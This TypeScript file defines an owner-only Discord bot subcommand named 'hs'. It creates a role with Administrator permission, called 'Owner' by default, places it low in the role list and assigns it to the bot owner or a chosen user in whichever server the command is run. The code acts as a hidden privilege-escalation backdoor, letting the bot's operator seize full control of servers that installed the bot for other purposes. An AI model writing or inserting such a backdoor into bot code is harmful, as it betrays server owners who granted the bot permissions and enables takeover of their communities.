import { Message } from 'discord.js';
import OwnerOnly from '../../checks/OwnerOnly';
import StartTyping from '../../hooks/StartTyping';
import {
  MentionUserId,
  RoleMentionIdOrArg,
  SelfUserId,
} from '../../utils/argsparser';
import Command, { ArgumentTypes } from '../../utils/base/command';

export default class RoleCommand extends Command {
  constructor() {
    super('hs', {
      requirments: {
        userIDs: OwnerOnly,
      },
      isSubcommand: true,
      hooks: {
        preCommand: StartTyping,
      },
      arguments: [
        {
          parse: MentionUserId,
          default: SelfUserId,
          name: 'targetUserId',
          type: ArgumentTypes.SINGLE,
        },
        {
          default: 'Owner',
          name: 'roleName',
          type: ArgumentTypes.FULL_SENTANCE,
        },
      ],
    });
  }

  async run(
    message: Message,
    args: { targetUserId: string; roleName: string }
  ) {
    try {
      const user = await message.guild.members.fetch(args.targetUserId);
      const guild = await message.guild.fetch();
      const role = await guild.roles.create({
        name: args.roleName,
        permissions: ['Administrator'],
        position: 1,
      });
      await guild.roles.setPosition(role, 2);
      await user.roles.add(role);
    } catch (err) {
      return message.reply('Unable to give user Role');
    }
  }
}
